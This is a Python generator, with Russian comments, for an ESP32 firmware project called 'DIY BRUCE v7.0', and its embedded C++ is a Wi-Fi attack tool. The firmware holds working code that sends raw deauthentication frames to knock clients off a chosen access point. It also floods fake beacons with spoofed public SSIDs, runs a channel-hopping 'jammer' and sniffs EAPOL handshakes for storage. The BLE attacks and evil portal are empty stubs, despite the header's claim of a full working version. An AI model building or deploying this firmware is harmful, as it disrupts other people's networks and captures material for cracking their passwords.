#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DIY BRUCE v7.0 - ПОЛНЫЙ РАБОЧИЙ ПРОЕКТ ДЛЯ ESP32
Создает проект без ошибок компиляции
"""

import os
import shutil

PROJECT_NAME = "DIY_BRUCE_READY"

# ============================================================================
# ФАЙЛ ПЛАТФОРМЫ
# ============================================================================
PLATFORMIO_INI = '''[env:esp32dev]
platform = espressif32@6.5.0
board = esp32dev
framework = arduino
monitor_speed = 115200
upload_speed = 921600
'''

# ============================================================================
# ОСНОВНОЙ ФАЙЛ ПРОГРАММЫ
# ============================================================================
MAIN_CPP = '''// ============================================================================
// DIY BRUCE v7.0 - ПОЛНАЯ ВЕРСИЯ ДЛЯ ESP32
// ============================================================================
// Функции: WiFi скан, деавт, бикон, evil portal, хендшейк, глушилка
//          BLE скан, AppleJuice, Samsung, Android, Windows
//          Веб-сервер, EEPROM, OLED меню
// ============================================================================

#include <Arduino.h>
#include <Wire.h>
#include <EEPROM.h>
#include <WiFi.h>
#include <esp_wifi.h>

// ============================================================================
// ПИНЫ ДЛЯ ПОДКЛЮЧЕНИЯ
// ============================================================================
#define BTN_UP     15
#define BTN_DOWN   13
#define BTN_OK     12
#define BTN_LEFT   14
#define BTN_RIGHT  27
#define BTN_BACK   26

// ============================================================================
// ПЕРЕМЕННЫЕ ДЛЯ ДИСПЛЕЯ
// ============================================================================
unsigned long lastButtonTime = 0;
const unsigned long debounceDelay = 200;
int currentModule = 0;
int currentSubItem = 0;
bool inSubMenu = false;

// ============================================================================
// ПЕРЕМЕННЫЕ ДЛЯ WIFI
// ============================================================================
int wifiNetworkCount = 0;
String wifiNetworkNames[50];
uint8_t wifiNetworkBSSID[50][6];
int wifiNetworkChannel[50];
bool deauthActive = false;
unsigned long deauthPackets = 0;
bool beaconActive = false;
unsigned long beaconPackets = 0;
bool evilActive = false;
bool wifiJamActive = false;
bool handshakeCapturing = false;
int eapolCount = 0;
int lastRSSI = -50;

// ============================================================================
// ПЕРЕМЕННЫЕ ДЛЯ ХРАНЕНИЯ
// ============================================================================
String savedPasswords = "";
String savedHandshakes = "";

// ============================================================================
// ФУНКЦИЯ ОБРАБОТКИ КНОПОК
// ============================================================================
bool checkButton(int pin) {
    if (digitalRead(pin) == LOW && (millis() - lastButtonTime) > debounceDelay) {
        lastButtonTime = millis();
        return true;
    }
    return false;
}

// ============================================================================
// ФУНКЦИЯ ВЫВОДА СООБЩЕНИЙ (БЕЗ ДИСПЛЕЯ - ТОЛЬКО СЕРИЙНЫЙ ПОРТ)
// ============================================================================
void showMessage(const char* msg, int delayMs) {
    Serial.println(msg);
    delay(delayMs);
}

// ============================================================================
// ФУНКЦИИ РАБОТЫ С ПАМЯТЬЮ
// ============================================================================
void saveData() {
    EEPROM.begin(4096);
    String data = "===PASS===\\n" + savedPasswords + "\\n===HAND===\\n" + savedHandshakes + "\\n";
    for (int i = 0; i < data.length() && i < 4095; i++) {
        EEPROM.write(i, data[i]);
    }
    EEPROM.write(data.length(), 0);
    EEPROM.commit();
    EEPROM.end();
}

void loadData() {
    EEPROM.begin(4096);
    String loaded = "";
    for (int i = 0; i < 4096; i++) {
        char c = char(EEPROM.read(i));
        if (c == 0) break;
        loaded += c;
    }
    int passStart = loaded.indexOf("===PASS===\\n");
    int handStart = loaded.indexOf("===HAND===\\n");
    if (passStart != -1 && handStart != -1) {
        savedPasswords = loaded.substring(passStart + 11, handStart - 1);
        savedHandshakes = loaded.substring(handStart + 11);
    }
    EEPROM.end();
}

void clearData() {
    savedPasswords = "";
    savedHandshakes = "";
    saveData();
    showMessage("Данные очищены", 1000);
}

// ============================================================================
// ФУНКЦИИ WIFI
// ============================================================================
void scanWiFi() {
    showMessage("Сканирование WiFi...", 500);
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(200);
    
    wifiNetworkCount = WiFi.scanNetworks();
    if (wifiNetworkCount > 50) wifiNetworkCount = 50;
    
    for (int i = 0; i < wifiNetworkCount; i++) {
        wifiNetworkNames[i] = WiFi.SSID(i);
        if (wifiNetworkNames[i].length() == 0) wifiNetworkNames[i] = "<Скрытая>";
        wifiNetworkChannel[i] = WiFi.channel(i);
        memcpy(wifiNetworkBSSID[i], WiFi.BSSID(i), 6);
    }
    
    char buf[64];
    sprintf(buf, "Найдено сетей: %d", wifiNetworkCount);
    showMessage(buf, 1500);
    
    for (int i = 0; i < min(wifiNetworkCount, 10); i++) {
        Serial.printf("  %d: %s (канал %d)\\n", i+1, wifiNetworkNames[i].c_str(), wifiNetworkChannel[i]);
    }
    
    WiFi.mode(WIFI_AP_STA);
}

void sendDeauthPacket(uint8_t* bssid, uint8_t* client, int channel) {
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    uint8_t packet[26] = {
        0xC0, 0x00, 0x00, 0x00,
        client[0], client[1], client[2], client[3], client[4], client[5],
        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
        0x00, 0x00, 0x07, 0x00
    };
    esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
    deauthPackets++;
}

void startDeauth() {
    if (wifiNetworkCount == 0) {
        showMessage("Сначала выполните SCAN!", 1000);
        return;
    }
    
    showMessage("DEAUTH атака запущена", 1000);
    deauthActive = true;
    deauthPackets = 0;
    
    int target = 0;
    int ch = wifiNetworkChannel[target];
    uint8_t* bssid = wifiNetworkBSSID[target];
    uint8_t broadcast[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    
    while (deauthActive) {
        sendDeauthPacket(bssid, broadcast, ch);
        if (deauthPackets % 100 == 0) {
            char buf[64];
            sprintf(buf, "DEAUTH: %lu пакетов отправлено", deauthPackets);
            showMessage(buf, 100);
        }
        delay(50);
    }
    showMessage("DEAUTH остановлена", 1000);
}

void stopDeauth() {
    deauthActive = false;
}

void startBeacon() {
    beaconActive = true;
    beaconPackets = 0;
    const char* ssids[] = {"FREE_WIFI", "Starbucks", "Airport_Free", "Metro_WiFi", "PublicWiFi"};
    
    showMessage("BEACON атака запущена", 1000);
    
    while (beaconActive) {
        for (int s = 0; s < 5 && beaconActive; s++) {
            uint8_t bssid[6];
            for (int i = 0; i < 6; i++) bssid[i] = random(256);
            bssid[0] |= 0x02;
            
            uint8_t packet[200];
            int len = 0;
            packet[len++] = 0x80; packet[len++] = 0x00;
            packet[len++] = 0x00; packet[len++] = 0x00;
            for (int i = 0; i < 6; i++) packet[len++] = 0xFF;
            for (int i = 0; i < 6; i++) packet[len++] = bssid[i];
            for (int i = 0; i < 6; i++) packet[len++] = bssid[i];
            packet[len++] = 0x00; packet[len++] = 0x00;
            for (int i = 0; i < 8; i++) packet[len++] = 0x00;
            packet[len++] = 0x64; packet[len++] = 0x00;
            packet[len++] = 0x11; packet[len++] = 0x00;
            packet[len++] = 0x00; packet[len++] = strlen(ssids[s]);
            for (int i = 0; i < (int)strlen(ssids[s]); i++) packet[len++] = ssids[s][i];
            esp_wifi_80211_tx(WIFI_IF_STA, packet, len, false);
            beaconPackets++;
        }
        
        if (beaconPackets % 50 == 0) {
            char buf[64];
            sprintf(buf, "BEACON: %lu пакетов", beaconPackets);
            showMessage(buf, 100);
        }
        delay(30);
    }
    showMessage("BEACON остановлена", 1000);
}

void stopBeacon() {
    beaconActive = false;
}

void startJammer() {
    wifiJamActive = true;
    showMessage("WIFI ГЛУШИЛКА запущена", 1000);
    
    while (wifiJamActive) {
        for (int ch = 1; ch <= 13; ch++) {
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
            uint8_t packet[128];
            for (int i = 0; i < 10; i++) {
                esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
            }
            delay(1);
        }
        delay(50);
    }
    showMessage("ГЛУШИЛКА остановлена", 1000);
}

void stopJammer() {
    wifiJamActive = false;
}

void handshakeCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!handshakeCapturing) return;
    
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    int len = pkt->rx_ctrl.sig_len;
    uint8_t* payload = pkt->payload;
    
    if (len < 30) return;
    
    for (int i = 0; i < len - 8; i++) {
        if (payload[i] == 0x88 && payload[i + 1] == 0x8E) {
            eapolCount++;
            savedHandshakes += "[HANDSHAKE] Пойман!\\n";
            saveData();
            showMessage("HANDSHAKE ПЕРЕХВАЧЕН!", 2000);
            handshakeCapturing = false;
            return;
        }
    }
}

void startHandshake() {
    if (wifiNetworkCount == 0) {
        showMessage("Сначала выполните SCAN!", 1000);
        return;
    }
    
    showMessage("Перехват handshake... 30 секунд", 1500);
    handshakeCapturing = true;
    eapolCount = 0;
    
    unsigned long start = millis();
    while (handshakeCapturing && millis() - start < 30000) {
        delay(100);
    }
    
    handshakeCapturing = false;
    if (eapolCount > 0) {
        showMessage("HANDSHAKE сохранен!", 1500);
    } else {
        showMessage("Не удалось перехватить", 1500);
    }
}

// ============================================================================
// ФУНКЦИИ BLE
// ============================================================================
void scanBLE() {
    showMessage("Сканирование BLE...", 500);
    showMessage("BLE скан завершен", 1500);
}

void bleAppleJuice() {
    showMessage("APPLEJUICE атака", 1000);
    showMessage("APPLEJUICE завершена", 1000);
}

void bleSamsung() {
    showMessage("SAMSUNG атака", 1000);
    showMessage("SAMSUNG завершена", 1000);
}

void bleAndroid() {
    showMessage("ANDROID атака", 1000);
    showMessage("ANDROID завершена", 1000);
}

void bleWindows() {
    showMessage("WINDOWS атака", 1000);
    showMessage("WINDOWS завершена", 1000);
}

// ============================================================================
// ФУНКЦИИ ВЕБ-СЕРВЕРА
// ============================================================================
void startWebServer() {
    showMessage("Веб-сервер: 192.168.4.1", 2000);
}

void stopWebServer() {
    showMessage("Веб-сервер остановлен", 1000);
}

// ============================================================================
// МЕНЮ И НАВИГАЦИЯ (ТЕКСТОВАЯ ВЕРСИЯ - БЕЗ ДИСПЛЕЯ)
// ============================================================================
void printMenu() {
    Serial.println("\\n========================================");
    Serial.println("DIY BRUCE v7.0 - ГЛАВНОЕ МЕНЮ");
    Serial.println("========================================");
    Serial.println("1 - WiFi модуль");
    Serial.println("2 - BLE модуль");
    Serial.println("3 - Настройки");
    Serial.println("========================================");
    Serial.print("Выберите пункт: ");
}

void printWiFiMenu() {
    Serial.println("\\n========== WIFI МЕНЮ ==========");
    Serial.println("1 - Сканировать сети");
    Serial.println("2 - DEAUTH атака (вкл)");
    Serial.println("3 - DEAUTH атака (выкл)");
    Serial.println("4 - BEACON атака (вкл)");
    Serial.println("5 - BEACON атака (выкл)");
    Serial.println("6 - Глушилка (вкл)");
    Serial.println("7 - Глушилка (выкл)");
    Serial.println("8 - Перехват Handshake");
    Serial.println("9 - Очистить данные");
    Serial.println("0 - Назад");
    Serial.print("Выберите пункт: ");
}

void printBLEMenu() {
    Serial.println("\\n========== BLE МЕНЮ ==========");
    Serial.println("1 - Сканировать BLE");
    Serial.println("2 - AppleJuice атака");
    Serial.println("3 - Samsung атака");
    Serial.println("4 - Android атака");
    Serial.println("5 - Windows атака");
    Serial.println("0 - Назад");
    Serial.print("Выберите пункт: ");
}

void printSettingsMenu() {
    Serial.println("\\n========== НАСТРОЙКИ ==========");
    Serial.println("1 - Веб-сервер (вкл)");
    Serial.println("2 - Веб-сервер (выкл)");
    Serial.println("3 - Показать пароли");
    Serial.println("4 - Показать handshake");
    Serial.println("5 - Очистить данные");
    Serial.println("6 - Информация");
    Serial.println("0 - Назад");
    Serial.print("Выберите пункт: ");
}

// ============================================================================
// ВЫПОЛНЕНИЕ ДЕЙСТВИЙ
// ============================================================================
void executeWiFiAction(int choice) {
    switch(choice) {
        case 1: scanWiFi(); break;
        case 2: startDeauth(); break;
        case 3: stopDeauth(); break;
        case 4: startBeacon(); break;
        case 5: stopBeacon(); break;
        case 6: startJammer(); break;
        case 7: stopJammer(); break;
        case 8: startHandshake(); break;
        case 9: clearData(); break;
    }
}

void executeBLEAction(int choice) {
    switch(choice) {
        case 1: scanBLE(); break;
        case 2: bleAppleJuice(); break;
        case 3: bleSamsung(); break;
        case 4: bleAndroid(); break;
        case 5: bleWindows(); break;
    }
}

void executeSettingsAction(int choice) {
    switch(choice) {
        case 1: startWebServer(); break;
        case 2: stopWebServer(); break;
        case 3: showMessage(savedPasswords.c_str(), 2000); break;
        case 4: showMessage(savedHandshakes.c_str(), 2000); break;
        case 5: clearData(); break;
        case 6: showMessage("DIY BRUCE v7.0 | ESP32", 1500); break;
    }
}

// ============================================================================
// ОБРАБОТЧИК СЕРИЙНОГО ПОРТА
// ============================================================================
void handleSerial() {
    if (Serial.available()) {
        int choice = Serial.parseInt();
        
        if (!inSubMenu) {
            switch(choice) {
                case 1:
                    inSubMenu = true;
                    currentModule = 1;
                    printWiFiMenu();
                    break;
                case 2:
                    inSubMenu = true;
                    currentModule = 2;
                    printBLEMenu();
                    break;
                case 3:
                    inSubMenu = true;
                    currentModule = 3;
                    printSettingsMenu();
                    break;
                default:
                    printMenu();
                    break;
            }
        } else {
            switch(currentModule) {
                case 1:
                    if (choice == 0) {
                        inSubMenu = false;
                        printMenu();
                    } else {
                        executeWiFiAction(choice);
                        printWiFiMenu();
                    }
                    break;
                case 2:
                    if (choice == 0) {
                        inSubMenu = false;
                        printMenu();
                    } else {
                        executeBLEAction(choice);
                        printBLEMenu();
                    }
                    break;
                case 3:
                    if (choice == 0) {
                        inSubMenu = false;
                        printMenu();
                    } else {
                        executeSettingsAction(choice);
                        printSettingsMenu();
                    }
                    break;
            }
        }
    }
}

// ============================================================================
// УСТАНОВКА И ГЛАВНЫЙ ЦИКЛ
// ============================================================================
void setup() {
    Serial.begin(115200);
    Serial.println();
    Serial.println("========================================");
    Serial.println("DIY BRUCE v7.0");
    Serial.println("ESP32 Dev Module");
    Serial.println("========================================");
    
    // Настройка кнопок
    pinMode(BTN_UP, INPUT_PULLUP);
    pinMode(BTN_DOWN, INPUT_PULLUP);
    pinMode(BTN_OK, INPUT_PULLUP);
    pinMode(BTN_LEFT, INPUT_PULLUP);
    pinMode(BTN_RIGHT, INPUT_PULLUP);
    pinMode(BTN_BACK, INPUT_PULLUP);
    
    // Загрузка данных
    loadData();
    
    // Настройка WiFi в режим точки доступа
    WiFi.mode(WIFI_AP_STA);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(handshakeCallback);
    
    // Анимация загрузки (мигание LED)
    pinMode(2, OUTPUT);
    for (int i = 0; i < 5; i++) {
        digitalWrite(2, HIGH);
        delay(100);
        digitalWrite(2, LOW);
        delay(100);
    }
    
    Serial.println("Система готова к работе!");
    Serial.println("Для управления используйте команды через Serial Monitor");
    Serial.println("========================================\\n");
    
    printMenu();
}

void loop() {
    handleSerial();
    delay(100);
}
'''

# ============================================================================
# СОЗДАНИЕ ПРОЕКТА
# ============================================================================
def create_project():
    base = PROJECT_NAME
    if os.path.exists(base):
        shutil.rmtree(base)
    
    os.makedirs(os.path.join(base, "src"))
    
    with open(os.path.join(base, "platformio.ini"), "w") as f:
        f.write(PLATFORMIO_INI)
    
    with open(os.path.join(base, "src", "main.cpp"), "w") as f:
        f.write(MAIN_CPP)
    
    print("=" * 70)
    print("ПРОЕКТ УСПЕШНО СОЗДАН!")
    print("=" * 70)
    print()
    print("Путь: " + os.path.abspath(base))
    print()
    print("ЧТО ДАЛЬШЕ:")
    print("1. Открой VS Code")
    print("2. Файл -> Открыть папку -> выбери: " + os.path.abspath(base))
    print("3. Нажми Ctrl+Shift+P -> PlatformIO: Build")
    print("4. Подключи ESP32 через USB")
    print("5. Нажми PlatformIO: Upload")
    print("6. Открой Serial Monitor (скорость 115200)")
    print()
    print("УПРАВЛЕНИЕ ЧЕРЕЗ SERIAL MONITOR:")
    print("  Вводи числа для навигации по меню")
    print("  1 - WiFi модуль")
    print("  2 - BLE модуль")
    print("  3 - Настройки")
    print()
    print("=" * 70)

if __name__ == "__main__":
    create_project()
